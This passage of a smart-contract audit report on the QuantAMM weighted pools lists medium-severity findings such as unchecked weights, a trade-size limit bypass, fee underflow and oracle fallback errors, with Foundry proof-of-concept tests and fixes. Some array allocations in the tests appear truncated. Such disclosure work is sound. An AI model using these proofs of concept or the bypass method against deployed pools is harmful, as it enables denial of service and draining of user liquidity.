However, the boundary of the normalized weights is not checked in the `setWeights` function in `QuantAMMWeightedPool` contract:

```Solidity
function setWeights(
        int256[] calldata _weights,
        address _poolAddress,
        uint40 _lastInterpolationTimePossible
    ) external override {
        require(msg.sender == address(updateWeightRunner), "ONLYUPDW");
        require(_weights.length == _totalTokens * 2, "WLDL"); //weight length different

        if (_weights.length > 8) {
            int256[][] memory splitWeights = _splitWeightAndMultipliers(_weights);
            _normalizedFirstFourWeights = quantAMMPack32Array(splitWeights[0])[0];
            _normalizedSecondFourWeights = quantAMMPack32Array(splitWeights[1])[0];
        } else {
            _normalizedFirstFourWeights = quantAMMPack32Array(_weights)[0];
        }

        //struct allows one SSTORE
        poolSettings.quantAMMBaseInterpolationDetails = QuantAMMBaseInterpolationVariables({
            lastPossibleInterpolationTime: _lastInterpolationTimePossible,
            lastUpdateIntervalTime: uint40(block.timestamp)
        });

        emit WeightsUpdated(_poolAddress, _weights);
    }

```

If the weights are out of bounds, this may lead to an overflow in the `WeightedMath` calculation. For example, the `computeBalance` function will revert due to the math overflow.

## Poc

Adding the  following test case in `QuantAMMWeightedPool2TokenTest` , it sets the weights to 0.0006 and 0.9994

```Solidity
function testComputeBalanceInitial() public {
        QuantAMMWeightedPoolFactory.NewPoolParams memory params = _createPoolParams();

        (address quantAMMWeightedPool, ) = quantAMMWeightedPoolFactory.create(params);

        int256[] memory newWeights = new int256[]();
        newWeights[0] = 0.0006e18;
        newWeights[1] = 0.9994e18;
        newWeights[2] = 0e18;
        newWeights[3] = 0e18;

        vm.prank(address(updateWeightRunner));
        QuantAMMWeightedPool(quantAMMWeightedPool).setWeights(
            newWeights,
            quantAMMWeightedPool,
            uint40(block.timestamp + 5)
        );

        uint256[] memory balances = new uint256[]();
        balances[0] = 1000e18;
        balances[1] = 2000e18;

        uint256 newBalance = QuantAMMWeightedPool(quantAMMWeightedPool).computeBalance(balances, 0, uint256(1.2e18));

        //assertEq(newBalance, 1355.091881588694578000e18);
    }
```

run `forge test --match-test testComputeBalanceInitial`

```Solidity
Failing tests:
Encountered 1 failing test in test/foundry/QuantAMMWeightedPool2Token.t.sol:QuantAMMWeightedPool2TokenTest
[FAIL: ProductOutOfBounds()] testComputeBalanceInitial() (gas: 12465744)
```

We can see that the `computeBalance` will revert due to math overflow.

## Impact

The impact is HIGH because this will dos the `computeBalance` function.

The likelihood is LOW because the weight should be less than 0.01 or greater than 0.99, which is not a normal case.

As a result, the severity should be MEDIUM.

## Tools Used

Manual Review

## Recommendations

In `QuantAMMWeightedPool` contract, consider adding a check on the weight boundaries in the `setWeights` function.

## <a id='M-09'></a>M-09. The `maxTradeSizeRatio` can be bypassed due to incorrect logic in `onSwap` function

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The code contains a logical vulnerability that arises from the handling of the `maxTradeSizeRatio` for both directions of the swap. Specifically, in `EXACT_IN` direction, the `maxTradeSizeRatio` is used to restrict the amount of the swapped in token and in `EXACT_OUT` direction, it is used to restrict the amount of the swapped out token. This inconsistency allows an attacker to exploit the system by structuring their trades in a way that allows them to get around the maximum trade size checks, effectively bypassing the `maxTradeSizeRatio` limits. 

## Vulnerability Details

In `QuantAMMWeightedPool`,the `maxTradeSizeRatio` is used to restrict maximum trade size allowed as a fraction of the pool. It is used in `onSwap` function:

```solidity
if (request.kind == SwapKind.EXACT_IN) {
            if (request.amountGivenScaled18 > request.balancesScaled18[request.indexIn].mulDown(maxTradeSizeRatio)) {
                revert maxTradeSizeRatioExceeded();
            }

            uint256 amountOutScaled18 = WeightedMath.computeOutGivenExactIn(
                request.balancesScaled18[request.indexIn],
                tokenInWeight,
                request.balancesScaled18[request.indexOut],
                tokenOutWeight,
                request.amountGivenScaled18
            );

            return amountOutScaled18;
        } else {
            // Cannot exceed maximum out ratio
            if (request.amountGivenScaled18 > request.balancesScaled18[request.indexOut].mulDown(maxTradeSizeRatio)) {
                revert maxTradeSizeRatioExceeded();
            }

            uint256 amountInScaled18 = WeightedMath.computeInGivenExactOut(
                request.balancesScaled18[request.indexIn],
                tokenInWeight,
                request.balancesScaled18[request.indexOut],
                tokenOutWeight,
                request.amountGivenScaled18
            );

            // Fees are added after scaling happens, to reduce the complexity of the rounding direction analysis.
            return amountInScaled18;
        }
```

 The issue here is that it is used in two direction, making it possible to bypass the `maxTradeSizeRatio` limits. 

Let's say there are 1000 tokenA and 2000 tokenB, the `maxTradeSizeRatio` is 0.3. Now we can swap 200 tokenA to 610 tokenB.&#x20;

If we  use `SwapKind.EXACT_OUT` swap, then

`request.amountGivenScaled18`=610

`request.balancesScaled18[request.indexOut].mulDown(maxTradeSizeRatio)`=2000 \* 0.3 = 600

Since 610>600, the swap will revert.&#x20;

If we change the swap to `SwapKind.EXACT_IN`, then

`request.amountGivenScaled18`=200

`request.balancesScaled18[request.indexIn].mulDown(maxTradeSizeRatio)`=1000\*0.3 = 300

Since 200<300, the swap will succeed.

This inconsistency allows an attacker to exploit the system by structuring their trades in a way that allows them to get around the maximum trade size checks, effectively bypassing the limits imposed on the outputs for `EXACT_OUT` trades. The `EXACT_IN` pathway becomes a backdoor for output amounts that breach the intended maximum size, risking liquidity and profitability for the pool.

## Impact

The impact is MEDIUM and the likelihood is MEDIUM, as a result, the severity should be MEDIUM.

## Tools Used

Manual Review

## Recommendations

Consider checking the `amountOutScaled18` when `request.kind == SwapKind.EXACT_IN`

```Solidity
if (request.kind == SwapKind.EXACT_IN) {
            

            uint256 amountOutScaled18 = WeightedMath.computeOutGivenExactIn(
                request.balancesScaled18[request.indexIn],
                tokenInWeight,
                request.balancesScaled18[request.indexOut],
                tokenOutWeight,
                request.amountGivenScaled18
            );

            if (amountOutScaled18 > request.balancesScaled18[request.indexOut].mulDown(maxTradeSizeRatio)) {
                revert maxTradeSizeRatioExceeded();
            }

            return amountOutScaled18;
        }
```

## <a id='M-10'></a>M-10. Users are charged too much `exitFee` in `UpliftOnlyExample::onAfterRemoveLiquidity` function when `localData.lpTokenDepositValueChange > 0` and can cause underflow error if `lpTokenDepositValueChange` increase too much.

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Users are charged too much `exitFee` in `UpliftOnlyExample::onAfterRemoveLiquidity` when `localData.lpTokenDepositValueChange > 0` and can cause underflow error if `lpTokenDepositValueChange` increase too much.

## Vulnerability Details

* In `UpliftOnlyExample::onAfterRemoveLiquidity`, whenever user remove their liquidity, they will be charged an `exitFee` based on `feePerLP`.
* And the `feePerLP` is calculated based on `lpTokenDepositValueChange`. [UpliftOnlyExample.sol#L480-L484](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L480-L484)

```solidity
    if (localData.lpTokenDepositValueChange > 0) {
        feePerLP =
            (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18)) /
            10000;
    }
```

* While the idea of charging `feePerLP` based on how much increase of deposit tokens value is a fair idea. But the implementation of the above code has a problem:
  * The `feePerLP` will increases proportionally with the `lpTokenDepositValueChange`. Developers may forget that even if `feePerLP` is a fixed percentage, the `exitFee` tokens value still increases proportionally with the `lpTokenDepositValueChange`.
* So, the value of `exitFee` will increase exponentially due to:
  1. The value of the tokens increases.
  2. The amount of fee tokens increases.

## Impact

* Users will be charged too much `exitFee` if `lpTokenDepositValueChange > 0`.
* And in a worse scenario, user can not withdraw their liquidity when `localData.lpTokenDepositValueChange > (10000 / upliftFeeBps)`. Leading to `feePerLP > 1e18`, the amount of `exitFee` exceed `hookAdjustedAmountsOutRaw` and cause underflow error with [this line of code: ](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L530)

```solidity
hookAdjustedAmountsOutRaw[i] -= exitFee;
```

## PoC

* If `upliftFeeBps` = 200, `lpTokenDepositValueChange` rise to 51 (price increase 52 times). User can not call `removeLiquidityProportional` function.
* Place this test in `UpliftExample.t.sol`
* Then in `/2024-12-quantamm/pkg/pool-hooks` run `forge test --mt test_tooMuch_exitFee_userCanNotWithdraw -vvvv`. Look into the terminal, the `removeLiquidityProportional` transaction will revert with `[Revert] panic: arithmetic underflow or overflow (0x11)` error.

```solidity
function test_tooMuch_exitFee_userCanNotWithdraw() public {
  LPNFT lpNft = upliftOnlyRouter.lpNFT();

  // Add liquidity so Bob has BPT to remove liquidity.
  uint256[] memory maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)]
    .toMemoryArray();

  vm.startPrank(bob);
  upliftOnlyRouter.addLiquidityProportional(
    pool,
    maxAmountsIn,
    bptAmount,
    false,
    bytes('')
  );
  vm.stopPrank();

  // Price increased 52 times
  skip(1 days);
  int256[] memory prices = new int256[]();
  for (uint256 i = 0; i < tokens.length; ++i) {
    prices[i] = int256(i) * 52e18;
  }
  updateWeightRunner.setMockPrices(pool, prices);
  uint256[] memory minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();
  vm.startPrank(bob);

  // Bob can not remove liquidity due to underflow
  vm.expectRevert();
  upliftOnlyRouter.removeLiquidityProportional(
    bptAmount,
    minAmountsOut,
    false,
    pool
  );
  vm.stopPrank();
}
```

## Tools Used

* Manual review.
* Foundry

## Recommendations

When calculating feePerLP:

* &#x20;Do not multifly `upliftFeeBps` with `lpTokenDepositValueChange`.

```diff
    if (localData.lpTokenDepositValueChange > 0) {
-        feePerLP =
-            (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18)) /
-            10000;
+        feePerLP = (uint256(feeDataArray[i].upliftFeeBps) * 1e18) / 10000;
    }
```

* Or, have a `maxWithdrawalFeeBps` variable.

```diff
+    uint64 public immutable maxWithdrawalFeeBps = 1000; // 10%
.
.
.
        if (localData.lpTokenDepositValueChange > 0) {
            feePerLP =
                (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18)) /
                10000;
        }
+       if (feePerLP > (maxWithdrawalFeeBps * 1e18) / 10000) {
+         feePerLP = (maxWithdrawalFeeBps * 1e18) / 10000;
+       }

```

## <a id='M-11'></a>M-11. If main oracle is removed from approved list it will keep returning not stale but invalid data (0 value)

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Because  stale data is preferred over a revert - if a primary oracle is disabled without backups `getData` would keep providing invalid data (0 value) to the rules until oracle is re-enabled.

## Vulnerability Details

As the stated in the cyfrin report 7.2.4 in regards to oracles

`A stale update is better than none because of the way the estimators encapsulate a weighted price and a certain level of smoothing`

It currently returns optimized (main) oracle  data even if it is stale. This makes the below comment left by the sponsors invalid

`Return empty timestamp if oracle is no longer approved, result will be discarded`

The result would not be discarded if the oracle is the main one and there are no backups.

```Solidity
function _getOracleData(OracleWrapper _oracle) private view returns (OracleData memory oracleResult) {
      if (!approvedOracles[address(_oracle)]) return oracleResult; // Return empty timestamp if oracle is no longer approved, result will be discarded
      (int216 data, uint40 timestamp) = _oracle.getData();
      oracleResult.data = data;
      oracleResult.timestamp = timestamp;
}

```

The consequence of this would be that 0 value data would be returned as a sucessful fetch and is not checked anywhere down the line apart from it's previously mentioned staleness.

Inside \_getData oracle loop

```Solidity
   for (uint i; i < oracleLength; ) {
            // Asset is base asset
            OracleData memory oracleResult;

            // @audit oracle without approval returns 0 values
            oracleResult = _getOracleData(OracleWrapper(optimisedOracles[i]));

            // @audit oracleResult.timestamp is zero - skip setting, but no revert
            if (oracleResult.timestamp > block.timestamp - oracleStalenessThreshold) {
                outputData[i] = oracleResult.data; 
            

            } else {

                unchecked {
                    numAssetOracles = poolBackupOracles[_pool][i].length;
                }

                // @audit loop is never entered if there are no backup oracles
                for (uint j = 1 /*0 already done via optimised poolOracles*/; j < numAssetOracles; ) {

                    oracleResult = _getOracleData(
                        OracleWrapper(poolBackupOracles[_pool][i][j])
                    );
                    if (oracleResult.timestamp > block.timestamp - oracleStalenessThreshold) {
                        // Oracle has fresh values
                        break;
                    } else if (j == numAssetOracles - 1) {
                        // All oracle results for this data point are stale. Should rarely happen in practice with proper backup oracles.

                        revert("No fresh oracle values available");
                    }
                    unchecked {
                        ++j;
                    }
                }
                // @audit oraceResult has zero value, but is still set and returned
                outputData[i] = oracleResult.data;
            }

            unchecked {
                ++i;
            }
        }
```

After \_getData call finishes:

```Solidity
function _getUpdatedWeightsAndOracleData (...) {
  data = _getData(_pool, true); // @audit returns zeroes

  updatedWeights = rules[_pool].CalculateNewWeights(
    _currentWeights,
    data, // @audit zeroes passed directly to rule weight calculation
    _pool,
    _ruleSettings.ruleParameters,
    _ruleSettings.lambda,
    _ruleSettings.epsilonMax,
    _ruleSettings.absoluteWeightGuardRail
  );
  ...
```

After the above `CalculateNewWeights` call finishes the `data` is not used anywhere else.

The oracle approvals `approvedOracles` are fully controlled by the admins. But they can't control the oracle output. And in a case when a single main oracle goes rouge it would create a dillema where `getData` will always return invalid data - either by the rogue oracle returned data or by the functionality of a disabled oracle `_getOracleData` (0 value).

It would be a rare occurance where the main oracle of a pool to be purposefully turned off (removed from approvedOracles) but is possible.&#x20;

A situation like this could also be introduced by aiming to disable a backup oracle of one pool, but missing that the same oracle is used as the main in another.

After the oracle is disabled  and the `performUpdate` is called the weights will be updated to invalid ones.

## Impact

&#x20;`getaData` should never return invalid data. Only up to date data / stale data (special cases) / revert.

&#x20;Any invalid weights would create  new arbitrage opportunities as longs as invalid weights (0 data values) are continuesly submitted. And again once weights are fixed. But due to special conditions required  - Medium. 

## Tools Used

Manual review + modified foundry `MinVarianceUpdateRuleTest` test, where the test passes with zero `data` value as the new data.

```Solidity
function testCalculateNewWeightsWith0NewData() public {
    // Set the number of assets to 2
    mockPool.setNumberOfAssets(2);

    // Define parameters and inputs
    int256[][] memory parameters = new int256[][]();
    parameters[0] = new int256[]();
    parameters[0][0] = 0.5e18;

    int256[] memory prevWeights = new int256[]();
    prevWeights[0] = 0.5e18;
    prevWeights[1] = 0.5e18;

    int256[] memory data = new int256[]();
    data[0] = 0; // @audit original test value PRBMathSD59x18.fromInt(3)
    data[1] = 0; // @audit original test value PRBMathSD59x18.fromInt(4)

    int256[] memory variances = new int256[]();
    variances[0] = PRBMathSD59x18.fromInt(1);
    variances[1] = PRBMathSD59x18.fromInt(1);

    int256[] memory prevMovingAverages = new int256[]();
    prevMovingAverages[0] = PRBMathSD59x18.fromInt(1);
    prevMovingAverages[1] = PRBMathSD59x18.fromInt(1) + 0.5e18;
    prevMovingAverages[2] = PRBMathSD59x18.fromInt(1);
    prevMovingAverages[3] = PRBMathSD59x18.fromInt(1) + 0.5e18;

    int128[] memory lambda = new int128[]();
    lambda[0] = 0.7e18;

    // Initialize pool rule intermediate values
    rule.initialisePoolRuleIntermediateValues(
        address(mockPool),
        prevMovingAverages,
        variances,
        mockPool.numAssets()
    );

    // Calculate unguarded weights
    rule.CalculateUnguardedWeights(prevWeights, data, address(mockPool), parameters, lambda, prevMovingAverages);

    // Get and check result weights
    int256[] memory res = rule.GetResultWeights();

    int256[] memory ex = new int256[]();
    ex[0] = 0.548283261802575107e18;
    ex[1] = 0.451716738197424892e18;

    // @audit with zero - 567204301075268817
    // @audit original -  548283261802575107
    console2.log("with zero weights", res[0]); 

    // @audit with zero data - 432795698924731182
    // @audit original -       451716738197424892
    console2.log("with zero weights", res[1]); 

    checkResult(res, ex);
    // Expected result: [0.5482832618025751, 0.4517167381974248]
}
```

## Recommendations

Oracles that are disabled should not return any result and be immediately discarded. A 0 value may be rare, but in theory is possible for extremly low value coins. So we check both data and timestamp for validity:

A solution would be to add an extra check at the end of the loop to see if the final result is not empty.

```Solidity
    function _getData(address _pool, bool internalCall) private view returns (int256[] memory outputData) {
        require(internalCall || (approvedPoolActions[_pool] & MASK_POOL_GET_DATA > 0), "Not allowed to get data");
        //optimised == happy path, optimised into a different array to save gas
        
        address[] memory optimisedOracles = poolOracles[_pool];
        uint oracleLength = optimisedOracles.length;
        uint numAssetOracles;
        outputData = new int256[](oracleLength);

        uint oracleStalenessThreshold = IQuantAMMWeightedPool(_pool).getOracleStalenessThreshold();


        for (uint i; i < oracleLength; ) {
            // Asset is base asset
            OracleData memory oracleResult;

            oracleResult = _getOracleData(OracleWrapper(optimisedOracles[i]));

                if (oracleResult.timestamp > block.timestamp - oracleStalenessThreshold) {
                    outputData[i] = oracleResult.data;

            } else {

                unchecked {

                    numAssetOracles = poolBackupOracles[_pool][i].length;
                }

                for (uint j = 1 /*0 already done via optimised poolOracles*/; j < numAssetOracles;) {
                  
                    oracleResult = _getOracleData(
                        OracleWrapper(poolBackupOracles[_pool][i][j])
                    );
                    if (oracleResult.timestamp > block.timestamp - oracleStalenessThreshold) {
                        // Oracle has fresh values
                        break;
                    } else if (j == numAssetOracles - 1) {
                        // All oracle results for this data point are stale. Should rarely happen in practice with proper backup oracles.
                    
                        revert("No fresh oracle values available");
                    }
                    unchecked {
                        ++j;
                    }

                }

                // NEW CHECK  
                // @audit add a new revert in case all are disapproved
                if (oracleResult.data == 0 && oracleResult.timestamp == 0) { 
                  revert("No oracles approved or returned no values");
                }
                
                outputData[i] = oracleResult.data;
            }

            unchecked {
                ++i;
            }
        }
    }
```

This is similar to what OracleWrapper already checks inside if the oracle is  approved:

```Solidity
    function getData() public view returns (int216 data, uint40 timestamp) {
        (data, timestamp) = _getData();
        require(timestamp > 0, "INVORCLVAL"); // Sanity check in case oracle returns invalid values
    }
```

## <a id='M-12'></a>M-12. Getting data from pool can be reverted when one of the oracle is not live

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Vulnerability Details

In `_getData()` function in `UpdateWeightRunner` contract, it use `_getOracleData()` function to get data from oracle:

```Solidity
    function _getData(address _pool, bool internalCall) private view returns (int256[] memory outputData) {
        require(internalCall || (approvedPoolActions[_pool] & MASK_POOL_GET_DATA > 0), "Not allowed to get data");
        //optimised == happy path, optimised into a different array to save gas
        address[] memory optimisedOracles = poolOracles[_pool];
        uint oracleLength = optimisedOracles.length;
        uint numAssetOracles;
        outputData = new int256[](oracleLength);
        uint oracleStalenessThreshold = IQuantAMMWeightedPool(_pool).getOracleStalenessThreshold();

        for (uint i; i < oracleLength; ) {
            // Asset is base asset
            OracleData memory oracleResult;
            oracleResult = _getOracleData(OracleWrapper(optimisedOracles[i]));                // <---
            if (oracleResult.timestamp > block.timestamp - oracleStalenessThreshold) {
                outputData[i] = oracleResult.data;
            } else {
                unchecked {
                    numAssetOracles = poolBackupOracles[_pool][i].length;
                }

                for (uint j = 1 /*0 already done via optimised poolOracles*/; j < numAssetOracles; ) {
                    oracleResult = _getOracleData(                                            // <---
                        // poolBackupOracles[_pool][asset][oracle]
                        OracleWrapper(poolBackupOracles[_pool][i][j])
                    );
                    if (oracleResult.timestamp > block.timestamp - oracleStalenessThreshold) {
                        // Oracle has fresh values
                        break;
                    } else if (j == numAssetOracles - 1) {
                        // All oracle results for this data point are stale. Should rarely happen in practice with proper backup oracles.

                        revert("No fresh oracle values available");
                    }
                    unchecked {
                        ++j;
                    }
                }
                outputData[i] = oracleResult.data;
            }

            unchecked {
                ++i;
            }
        }
    }
```

It will call to `getData()` function of oracle:

```Solidity
function _getOracleData(OracleWrapper _oracle) private view returns (OracleData memory oracleResult) {
    if (!approvedOracles[address(_oracle)]) return oracleResult; // Return empty timestamp if oracle is no longer approved, result will be discarded
    (int216 data, uint40 timestamp) = _oracle.getData();    // <---
    oracleResult.data = data;
    oracleResult.timestamp = timestamp;
}
```

`getData()` function in `OracleWrapper` abstract contract:

```Solidity
function getData() public view returns (int216 data, uint40 timestamp) {
    (data, timestamp) = _getData();
    require(timestamp > 0, "INVORCLVAL");    // <--
}
```

`_getData()` function in `ChainlinkOracle` contract:

```Solidity
function _getData() internal view override returns (int216, uint40) {
    (, /*uint80 roundID*/ int data, , /*uint startedAt*/ uint timestamp, ) = /*uint80 answeredInRound*/
    priceFeed.latestRoundData();
    require(data > 0, "INVLDDATA");    // <--
    data = data * int(10 ** normalizationFactor);
    return (int216(data), uint40(timestamp));
}
```

It can be seen that there are 2 scenario that will lead to revert in `getData()` and `_getData()` function, one of them can be happened in the real scenario, which is noted by chainlink's dev at here [link](https://docs.chain.link/data-feeds/historical-data#solidity)

```Solidity
 *
 * @dev A timestamp with zero value means the round is not complete and should not be used.
 */
```

So, when one of the oracle requested revert, function `getData()` in `UpdateWeightRunner` contract will revert,  lead to DoS in multiple functions that need to get data from oracle. It is a big problem for smoothing of protocol, Which mentioned in issue M-4 of the report link: <https://github.com/Cyfrin/2024-12-quantamm/blob/main/pkg/pool-quantamm/audit/Cyfrin_1_2_20241217.pdf>

## Recommendations

Move these checking conditions to `_getData()` function in `UpdateWeightRunner` contract when calling oracle, or using try - catch when call `_getOracleData()` function

## <a id='M-13'></a>M-13. Protocol Fees Diminished Due to Admin Fee Payment on Liquidity Removal

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

When removing liquidity, the protocol admin is charged fees that reduce the protocol's yield, as tokens are minted to the admin address which then incurs fees on removal. This occurs even when not using the `UpliftOnlyExample` contract, as fees are charged by the vault itself depending on the `kind` of remove liquidity.

## Vulnerability Details

In the `UpliftOnlyExample` contract, tokens are minted to the protocol admin address:

```solidity
to: IUpdateWeightRunner(_updateWeightRunner).getQuantAMMAdmin()
```

When these tokens are later removed, fees are charged. This means that when the admin removes liquidity, they pay fees that reduce the protocol's overall yield.

For example:
Protocol yield from fees = 100
Fee to remove liquidity = 1%

The protocol will receive 99 from the yield. Even though they were entitled to 100.

This is separate from profit and loss of a LP position. This is a reduction in yield for the protocol regardless of the value that the LP position is worth.

## Impact

Loss of yield - The protocol receives less yield than intended due to fees being charged on admin liquidity removal.

## Tools Used

Manual Review

## Recommendations

When calculating fee rates for liquidity removal, implement logic to account for fees that will be paid by the admin. This ensures the protocol receives its full intended yield by adjusting the fee rate when the admin removes liquidity.

## <a id='M-14'></a>M-14. Incorrect implementation of QuantammMathGuard.sol#_clampWeights.

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

&#x20;

In the contract `QuantammMathGuard.sol`, `_clampWeights` is implemented wrongly, causing the sum of \_weights to be larger than 1 and some weights will be larger than absoluteMax.

## Vulnerability Details

The function `_clampWeights` is used to limit the weights to ensure that each weight does not exceed the predefined minimum and maximum values after being updated. In the implementation, two variables are crucial, namely `sumRemainerWeight` and `sumOtherWeights`.

```Solidity
            for (uint i; i < weightLength; ++i) {
                if (_weights[i] < absoluteMin) {
                    _weights[i] = absoluteMin;
                    sumRemainerWeight -= absoluteMin;
                } else if (_weights[i] > absoluteMax) {
                    _weights[i] = absoluteMax;
                    sumOtherWeights += absoluteMax;
                }
            }
            if (sumOtherWeights != 0) {
                int256 proportionalRemainder = sumRemainerWeight.div(sumOtherWeights);
                for (uint i; i < weightLength; ++i) {
                    if (_weights[i] != absoluteMin) {
                        _weights[i] = _weights[i].mul(proportionalRemainder);
                    }
                }
            }


```

The variable `sumRemainerWeight` is used to calculate the target value of the sum of the remaining weights(except those below the `_absoluteWeightGuardRail`). And the variable `sumOtherWeights` is used to calculate the actual value of the sum of the remaining weights. Later, variable `proportionalRemainder` is calculated and the role of the variable `proportionalRemainder` is to scale other weights so that their sum is `sumRemainerWeight`.

Let me take a example where `_absoluteWeightGuardRail` = 0.2 and `_weights` = \[0.15, 0.45, 0.15, 0.25]. So the `absoluteMin` = 0.2 and `absoluteMax` = 0.4 (1-0.2\*3).

(1) For the first weight 0.15, \_weights\[0] = 0.2 and sumRemainerWeight = 0.8.

(2) For the second weight 0.45, \_weights\[1] = 0.4 and sumOtherWeights = 0.4.

(3) For the third weight 0.15, \_weights\[2] = 0.2 and sumRemainerWeight = 0.6.

(4) For the fouth weight 0.25, \_weights\[3] = 0.25.

So the `sumRemainerWeight` = 0.6 and `sumOtherWeights` = 0.4, which calculates the `proportionalRemainder` = 1.5.

**After updating, the \_weights will be \[0.2, 0.6, 0.2, 0.375], which is amazing!!!**

So what's the problem? The answer is that the variable `sumOtherWeights` is not calculated properly. It leaves out all weights that do not exceed `absoluteMax`, causing its value to be much smaller than expected.

In the example above, `sumOtherWeights` should be 0.4+0.25=0.65 and proportionalRemainder will be 12/13. **Finally, \_weights will be \[0.2, 0.37, 0.2, 0.23] whose sum is 1.**

## Impact

The function \_clampWeights will calculate incorrect weights, which will break the core functionality of the protocol.

## Tools Used

VScode

## Recommendations

The correct implementation should be as follows

```Solidity
            for (uint i; i < weightLength; ++i) {
                if (_weights[i] < absoluteMin) {
                    _weights[i] = absoluteMin;
                    sumRemainerWeight -= absoluteMin;
                } else if (_weights[i] > absoluteMax) {
                    _weights[i] = absoluteMax;
                    sumOtherWeights += absoluteMax;
                } else {
+++	                  sumOtherWeights += _weights[i];
                }
            }

```

## <a id='M-15'></a>M-15. Wrong Fee Take Function Called in UpliftOnlyExample Causing Incorrect Fee Distribution

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Vulnerability Details
In `UpliftOnlyExample.sol`, when calculating swap fees in `onAfterSwap()`, the contract calls `getQuantAMMUpliftFeeTake()` instead of `getQuantAMMSwapFeeTake()`. This is incorrect because:

 Looking at the UpdateWeightRunner contract, there are two separate fee take percentages:
   - `quantAMMSwapFeeTake` - For swap fees (accessed via `getQuantAMMSwapFeeTake()`)
   - An uplift fee take intended for withdrawal uplift fees (accessed via `getQuantAMMUpliftFeeTake()`)

The context is clearly for swap fees since this occurs in onAfterSwap(), so it should have used getQuantAMMSwapFeeTake().
```solidity
function onAfterSwap(AfterSwapParams calldata params) // ...
// ... snip ...
// @audit should be getQuantAMMSwapFeeTake()
@>   uint256 quantAMMFeeTake = IUpdateWeightRunner(_updateWeightRunner).getQuantAMMUpliftFeeTake(); 
         uint256 ownerFee = hookFee;
// ...
```

## Impact
The bug causes the wrong fee percentage to be used for swap fee calculations. 

## Tools used
Manual Review

## Recommendations
Fix the function call in UpliftOnlyExample.sol in the `onAfterSwap` function:
```diff
- uint256 quantAMMFeeTake = IUpdateWeightRunner(_updateWeightRunner).getQuantAMMUpliftFeeTake();
+ uint256 quantAMMFeeTake = IUpdateWeightRunner(_updateWeightRunner).getQuantAMMSwapFeeTake(); 
```

## <a id='M-16'></a>M-16. Liquidity Removal Reverts in `onAfterRemoveLiquidity` Callback Triggered by `removeLiquidityProportional`

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

When users call the `removeLiquidityProportional` function, it triggers the `onAfterRemoveLiquidity` callback, which calculates fees and attempts to add them back to the pool using `vault.addLiquidity`. If the fees fall below `_MINIMUM_TRADE_AMOUNT` of the vault, the `addLiquidity` function reverts, causing the entire liquidity removal process to fail. This unintentionally locks user funds and imposes additional constraints on liquidity providers.

## Vulnerability Details

* **Entry Point**: `removeLiquidityProportional`

  * This function indirectly triggers the `onAfterRemoveLiquidity` callback, where the issue arises.

* **Callback Function**: `onAfterRemoveLiquidity`

  * This function calculates fees, including the `localData.accruedQuantAMMFees` and `localData.accruedFees`, and attempts to reinvest them into the pool via `vault.addLiquidity`.
  * When the calculated fee amount (e.g., `localData.feeAmount.mulDown(localData.adminFeePercent)`) is less than `_MINIMUM_TRADE_AMOUNT`, the `addLiquidity` call reverts.

* **Unintended Consequences**:

  * Users with accrued fees below the threshold cannot successfully remove their liquidity.
  * The `_MINIMUM_TRADE_AMOUNT` for removing liquidity becomes indirectly tied to accrued fees, deviating from the globally set value.

## POC

* Example Scenarios:
  * `minWithdrawalFeeBps = 5 //0.0005%`
  * `QuantAMMUpliftFeeTake = 200 //2%`
  * `_MINIMUM_TRADE_AMOUNT = 0.5e18`

```solidity
function test_myTest() public {
        uint256[] memory maxAmountsIn = [uint(1e18), uint(1e18)].toMemoryArray();

        uint bptAmount = 1e18 * 2;

        vm.prank(bob);
        upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmount, false, bytes(""));
        vm.stopPrank();
        uint256[] memory minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();

        vm.startPrank(bob);
        upliftOnlyRouter.removeLiquidityProportional(bptAmount, minAmountsOut, false, pool);
        vm.stopPrank();
    }

```

Above test will revert with `TradeAmountTooSmall()` error from the `vault`.

As the test above the user is allowed to add 1e18 of each token, but not allowed to removeLiquidty
this is because after calculation, one or both of the fees is below the `_MINIMUM_TRADE_AMOUNT ` of the vault.

Hence for such user to remove liquidity, using the above example scenerio, the user need to add almost 2000e18 of each token. users below who dont add up to this amount cannot remove liquidity.

Note: you can manually set the \_MINIMUM\_TRADE\_AMOUNT in the vault just to test as it is 0 be default

```solidity
        _MINIMUM_TRADE_AMOUNT = 0.01e18;//IVaultAdmin(address(vaultExtension)).getMinimumTradeAmount();
```

## Impact

* Locked Funds: Users unable to meet the \_MINIMUM\_TRADE\_AMOUNT threshold for fees have their liquidity effectively locked.
* Higher Costs: Users are forced to pay more fees than intended by adding more liquidity to complete their removal process.
* System Inconsistencies: \_MINIMUM\_TRADE\_AMOUNT behaves differently in the context of fee reinvestment compared to its intended global behavior. This issue forces a new \_MINIMUM\_TRADE\_AMOUNT for liquidity removal to complete

## Tools Used

Manual Code Review

## Recommendations

1. Adding liquidity should not go through, if removal will not work with the same amount

